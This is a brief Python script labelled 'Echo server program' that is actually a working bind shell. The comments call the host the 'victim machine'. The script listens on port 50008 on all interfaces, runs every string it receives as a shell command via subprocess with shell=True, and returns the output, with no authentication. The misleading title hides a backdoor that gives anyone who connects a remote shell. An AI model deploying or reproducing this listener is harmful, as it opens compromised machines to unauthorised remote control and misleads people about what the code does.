# Echo server program
import socket
import sys
import subprocess

# Replace the HOST and PORT with IP/PORT of victim machine
HOST = '0.0.0.0' # IP of victim machine
PORT = 50008   # Port of victim machine
s = None

# Ask the kernel for a newly-initialised (unbound) socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Force the socket to open after 
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

# Assign a port number to the socket and specify the network interface
# Note: HOST refers to an interface of THIS machine, not a remote one
s.bind((HOST, PORT))

# Ask the kernel to accept incoming connection and queue them
s.listen()

# waiting for a connection, when it is made, put the new socket into conn_sock
while True:

    # Accept connection --> conn_sock is socket and address is IP
    (conn_sock, address) = s.accept()

    while True:

        # Create variable that takes a strip version of received packet
        data = conn_sock.recv(1024).strip()

        # Converts the byte format to string format
        str_data = str(data, 'UTF8')
        
        # Splits multiple strings into individual strings
        # str_array = str_data.split()
        
        # If the receiving data is empty then end the connection
        if len(data) == 0:
            break
        
        # Create variable result that takes the array as input, allows for shell commands (can replace parameters with just str_array)
        result = subprocess.check_output(str_data, shell=True)

        # Send back the output in bytes format
        conn_sock.send(bytes(result))

    # Close the socket connection
    conn_sock.close()

# Close the original socket
s.close()

print("bye")